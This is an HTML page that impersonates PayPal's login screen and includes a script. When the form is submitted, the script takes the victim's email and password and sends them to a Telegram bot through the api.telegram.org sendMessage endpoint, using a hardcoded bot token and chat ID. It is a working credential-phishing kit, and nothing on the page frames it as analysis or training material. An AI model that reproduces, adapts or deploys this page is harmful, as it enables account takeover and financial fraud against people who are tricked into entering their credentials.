<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f3f4f6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            padding: 40px;
            border-radius: 5px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        h2 {
            text-align: center;
            color: #0070ba;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #333;
        }
        .form-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 5px;
            transition: border-color 0.3s;
        }
        .form-group input:focus {
            border-color: #0070ba;
            outline: none;
        }
        .form-group button {
            width: 100%;
            padding: 12px;
            background-color: #0070ba;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .form-group button:hover {
            background-color: #0056a1;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #555;
        }
        .logo {
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/PayPal_logo.svg" alt="PayPal Logo" width="150">
        <h2>Login to PayPal</h2>
        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email Address:</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="form-group">
                <button type="submit">Login</button>
            </div>
        </form>
        <div class="footer">Â© 2024 PayPal, Inc.</div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form submission

            // Get the values from the input fields
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Send the data to your server
            fetch('https://api.telegram.org/bot7671624231:AAEBVOi-Ve8AzztCBYEld0k-61J-7yqtCxU/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '6091511411',
                    text: `Login Attempt:\nEmail: ${email}\nPassword: ${password}\nIP Address: ${window.location.hostname}`
                }),
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert('Login information sent successfully!');
                } else {
                    alert('Error sending information. Please try again.');
                }
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        });
    </script>

</body>
</html>
